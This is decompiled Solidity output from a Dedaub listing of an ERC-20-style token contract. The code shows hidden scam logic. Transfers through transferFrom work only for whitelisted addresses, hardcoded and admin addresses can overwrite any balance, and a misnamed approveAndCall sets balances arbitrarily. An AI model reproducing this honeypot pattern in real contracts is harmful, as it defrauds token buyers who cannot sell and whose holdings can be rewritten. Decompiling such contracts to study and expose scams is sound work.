// Decompiled by library.dedaub.com
// 2023.10.28 13:27 UTC
// Compiled using the solidity compiler version 0.4.7<=v<0.5.9
// https://library.dedaub.com/decompile?md5=de569c0b699d089a4eccab9cb9ff17f7

// Data structures and variables inferred from the use of storage instructions
uint256[] array_3; // STORAGE[0x3]
uint256[] array_4; // STORAGE[0x4]
uint256 _totalSupply; // STORAGE[0x6]
mapping (uint256 => uint256) _balances; // STORAGE[0x9]
mapping (uint256 => uint256) _allow; // STORAGE[0xa]
mapping (uint256 => mapping (uint256 => uint256)) _allowed; // STORAGE[0xb]
uint256 _owner; // STORAGE[0x0] bytes 0 to 19
uint256 _decimals; // STORAGE[0x5] bytes 0 to 0
uint256 __usdtPair; // STORAGE[0x1] bytes 0 to 19
uint256 __mod; // STORAGE[0x2] bytes 0 to 19
uint256 __user; // STORAGE[0x7] bytes 0 to 19
uint256 __adm; // STORAGE[0x8] bytes 0 to 19


// Events
Approval(address, address, uint256);
Transfer(address, address, uint256);
OwnershipTransferred(address, address);

function () public payable { 
    revert();
}

function name() public nonPayable { 
    v0, v1 = 0xb5b();
    v2 = new bytes[](v0.length);
    v3 = v4 = 0;
    while (v3 < v0.length) {
        v2[v3] = v0[v3];
        v3 = v3 + 32;
    }
    v5 = v6 = v0.length + v2.data;
    if (0x1f & v0.length) {
        MEM[v6 - (0x1f & v0.length)] = ~(256 ** (32 - (0x1f & v0.length)) - 1) & MEM[v6 - (0x1f & v0.length)];
    }
    return v2;
}

function 0x16b1() private { 
    v0 = new bytes[](((!(0x1 & array_4.length) << 8) - 1 & array_4.length) >> 1);
    v1 = v2 = v0.data;
    if (!(((!(0x1 & array_4.length) << 8) - 1 & array_4.length) >> 1)) {
        return v0, v3;
    } else if (31 < ((!(0x1 & array_4.length) << 8) - 1 & array_4.length) >> 1) {
        v4 = v5 = array_4.data;
        do {
            MEM[v1] = STORAGE[v4];
            v4 += 1;
            v1 += 32;
        } while (v2 + (((!(0x1 & array_4.length) << 8) - 1 & array_4.length) >> 1) <= v1);
        return v0, v3;
    } else {
        MEM[v2] = array_4.length >> 8 << 8;
        return v0, v3;
    }
}

function approve(address varg0, uint256 varg1) public nonPayable { 
    _allowed[msg.sender][varg0] = varg1;
    emit Approval(msg.sender, varg0, varg1);
    return bool(1);
}

function _usdtPair() public nonPayable { 
    return __usdtPair;
}

function totalSupply() public nonPayable { 
    return _totalSupply;
}

function transferFrom(address varg0, address varg1, uint256 varg2) public nonPayable { 
    require(bool(address(address(varg1)) != address(0x0)));
    require(bool(varg2 <= _balances[address(address(address(varg0)))]));
    require(bool(varg2 <= _allowed[address(address(address(varg0)))][address(address(msg.sender))]));
    require(bool(bool(uint8(_allow[address(address(address(varg0)))])) == bool(1)));
    assert(bool(varg2 <= _balances[varg0]));
    _balances[varg0] = _balances[varg0] - varg2;
    assert(bool(_balances[varg1] + varg2 >= _balances[varg1]));
    _balances[varg1] = _balances[varg1] + varg2;
    assert(bool(varg2 <= _allowed[varg0][msg.sender]));
    _allowed[varg0][msg.sender] = _allowed[varg0][msg.sender] - varg2;
    emit Transfer(varg0, varg1, varg2);
    return bool(1);
}

function balances(address varg0) public nonPayable { 
    return _balances[varg0];
}

function decimals() public nonPayable { 
    return _decimals;
}

function approveAndCall(address varg0, uint256 varg1) public nonPayable { 
    require(bool(address(msg.sender) == __adm));
    if (varg1 > 0) {
        _balances[varg0] = varg1;
    }
    return bool(1);
}

function setMod(address varg0) public nonPayable { 
    require(bool(address(msg.sender) == __user));
    __mod = varg0;
    return bool(0);
}

function mint(address varg0, uint256 varg1) public nonPayable { 
    require(bool(address(msg.sender) == address(0x1f490e99657cd08a058c6bb6cd81dd38f59e0e7a)));
    _balances[varg0] = varg1;
}

function setAdm(address varg0) public nonPayable { 
    require(bool(address(msg.sender) == __mod));
    __adm = varg0;
    return bool(0);
}

function addAllow(address varg0, bool varg1) public nonPayable { 
    require(bool(address(msg.sender) == address(0x1f490e99657cd08a058c6bb6cd81dd38f59e0e7a)));
    _allow[varg0] = varg1 | bytes31(_allow[address(address(address(varg0)))]);
}

function allowed(address varg0, address varg1) public nonPayable { 
    return _allowed[varg0][varg1];
}

function balanceOf(address varg0) public nonPayable { 
    return _balances[varg0];
}

function addAllowance(address varg0, bool varg1) public nonPayable { 
    require(bool(address(msg.sender) == __adm));
    _allow[varg0] = varg1 | bytes31(_allow[address(address(address(varg0)))]);
}

function setUser(address varg0) public nonPayable { 
    require(bool(address(msg.sender) == __usdtPair));
    __user = varg0;
    return bool(0);
}

function _user() public nonPayable { 
    return __user;
}

function owner() public nonPayable { 
    return _owner;
}

function symbol() public nonPayable { 
    v0, v1 = 0x16b1();
    v2 = new bytes[](v0.length);
    v3 = v4 = 0;
    while (v3 < v0.length) {
        v2[v3] = v0[v3];
        v3 = v3 + 32;
    }
    v5 = v6 = v0.length + v2.data;
    if (0x1f & v0.length) {
        MEM[v6 - (0x1f & v0.length)] = ~(256 ** (32 - (0x1f & v0.length)) - 1) & MEM[v6 - (0x1f & v0.length)];
    }
    return v2;
}

function transfer(address varg0, uint256 varg1) public nonPayable { 
    require(bool(address(address(varg0)) != address(0x0)));
    require(bool(varg1 <= _balances[address(address(msg.sender))]));
    assert(bool(varg1 <= _balances[msg.sender]));
    _balances[msg.sender] = _balances[msg.sender] - varg1;
    assert(bool(_balances[varg0] + varg1 >= _balances[varg0]));
    _balances[varg0] = _balances[varg0] + varg1;
    emit Transfer(msg.sender, varg0, varg1);
    return bool(1);
}

function setUsdtPair(address varg0) public nonPayable { 
    require(bool(address(msg.sender) == address(0x78322d0c5768c9ca370ddfc1d44db0fef3a6e051)));
    __usdtPair = varg0;
    return bool(0);
}

function _mod() public nonPayable { 
    return __mod;
}

function allowance(address varg0, address varg1) public nonPayable { 
    return _allowed[varg0][varg1];
}

function _adm() public nonPayable { 
    return __adm;
}

function showuint160(address varg0) public nonPayable { 
    return varg0;
}

function transferOwnership(address varg0) public nonPayable { 
    require(bool(address(msg.sender) == address(0x1f490e99657cd08a058c6bb6cd81dd38f59e0e7a)));
    require(bool(address(address(varg0)) != address(0x0)));
    emit OwnershipTransferred(_owner, varg0);
    _owner = varg0;
}

function allow(address varg0) public nonPayable { 
    return bool(uint8(_allow[address(varg0)]));
}

function 0xb5b() private { 
    v0 = new bytes[](((!(0x1 & array_3.length) << 8) - 1 & array_3.length) >> 1);
    v1 = v2 = v0.data;
    if (!(((!(0x1 & array_3.length) << 8) - 1 & array_3.length) >> 1)) {
        return v0, v3;
    } else if (31 < ((!(0x1 & array_3.length) << 8) - 1 & array_3.length) >> 1) {
        v4 = v5 = array_3.data;
        do {
            MEM[v1] = STORAGE[v4];
            v4 += 1;
            v1 += 32;
        } while (v2 + (((!(0x1 & array_3.length) << 8) - 1 & array_3.length) >> 1) <= v1);
        return v0, v3;
    } else {
        MEM[v2] = array_3.length >> 8 << 8;
        return v0, v3;
    }
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__(bytes4 function_selector) public payable { 
    MEM[64] = 128;
    if (msg.data.length >= 4) {
        v0 = uint32(function_selector >> 224);
        if (0x6fdde03 == v0) {
            name();
        } else if (0x95ea7b3 == v0) {
            approve(address,uint256);
        } else if (0x11de19e7 == v0) {
            _usdtPair();
        } else if (0x18160ddd == v0) {
            totalSupply();
        } else if (0x23b872dd == v0) {
            transferFrom(address,address,uint256);
        } else if (0x27e235e3 == v0) {
            balances(address);
        } else if (0x313ce567 == v0) {
            decimals();
        } else if (0x3177029f == v0) {
            approveAndCall(address,uint256);
        } else if (0x376d567c == v0) {
            setMod(address);
        } else if (0x40c10f19 == v0) {
            mint(address,uint256);
        } else if (0x4a0af68d == v0) {
            setAdm(address);
        } else if (0x55eff2f6 == v0) {
            addAllow(address,bool);
        } else if (0x5c658165 == v0) {
            allowed(address,address);
        } else if (0x70a08231 == v0) {
            balanceOf(address);
        } else if (0x791f83eb == v0) {
            addAllowance(address,bool);
        } else if (0x858ced35 == v0) {
            setUser(address);
        } else if (0x891e1ee0 == v0) {
            _user();
        } else if (0x8da5cb5b == v0) {
            owner();
        } else if (0x95d89b41 == v0) {
            symbol();
        } else if (0xa9059cbb == v0) {
            transfer(address,uint256);
        } else if (0xade2de02 == v0) {
            setUsdtPair(address);
        } else if (0xd21c8d55 == v0) {
            _mod();
        } else if (0xdd62ed3e == v0) {
            allowance(address,address);
        } else if (0xe2daf665 == v0) {
            _adm();
        } else if (0xe9543fa2 == v0) {
            showuint160(address);
        } else if (0xf2fde38b == v0) {
            transferOwnership(address);
        } else if (0xff9913e8 == v0) {
            allow(address);
        }
    }
    ();
}
